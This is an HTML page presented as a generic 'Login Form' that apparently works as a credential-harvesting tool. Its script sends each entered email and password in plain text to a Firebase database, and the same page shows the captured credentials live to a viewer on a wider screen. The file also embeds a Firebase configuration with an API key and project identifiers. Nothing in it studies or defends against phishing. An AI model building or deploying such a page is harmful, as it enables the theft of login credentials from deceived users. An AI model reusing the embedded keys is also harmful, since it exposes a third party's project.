<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Live Data Tracking</title>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
  <style>
    body { background: #000; color: #fff; font-family: Arial; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    .box { width: 300px; padding: 20px; border: 1px solid #333; border-radius: 10px; }
    input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: none; color: #fff; box-sizing: border-box; }
    button { width: 100%; padding: 12px; background: #ff0050; border: none; color: #fff; cursor: pointer; font-weight: bold; }
    #laptopView { margin-top: 20px; padding: 15px; border: 2px solid #ff0050; width: 300px; text-align: center; display: none; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Login Form</h2>
    <input type="email" id="email" placeholder="Enter Email">
    <input type="password" id="password" placeholder="Enter Password">
    <button onclick="sendData()">Login</button>
  </div>
  <div id="laptopView">
    <h3 style="color: #ff0050;">Live Message from Mobile:</h3>
    <p id="displayEmail">Waiting...</p>
    <p id="displayPass" style="color: #777;"></p>
    <button onclick="clearData()" style="background: #444; margin-top:10px; font-size: 11px;">Clear Screen</button>
  </div>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDybpDWjASFzZyazeyLJNUyrvhexQ3JYVY",
      authDomain: "my-fast-project-8ae0f.firebaseapp.com",
      databaseURL: "https://my-fast-project-8ae0f-default-rtdb.firebaseio.com",
      projectId: "my-fast-project-8ae0f",
      storageBucket: "my-fast-project-8ae0f.firebasestorage.app",
      messagingSenderId: "1084988161384",
      appId: "1:1084988161384:web:0409d9d64005df21d66add"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    function sendData() {
      const email = document.getElementById('email').value;
      const pass = document.getElementById('password').value;
      if(email && pass) {
        db.ref('messages').set({ email, pass });
        alert("Done");
      }
    }
    if (window.innerWidth > 768) {
      document.getElementById('laptopView').style.display = "block";
      db.ref('messages').on('value', (snapshot) => {
        const data = snapshot.val();
        if (data) {
          document.getElementById('displayEmail').innerText = "Email: " + data.email;
          document.getElementById('displayPass').innerText = "Password: " + data.pass;
        }
      });
    }
    function clearData() { db.ref('messages').remove(); }
  </script>
</body>
</html>
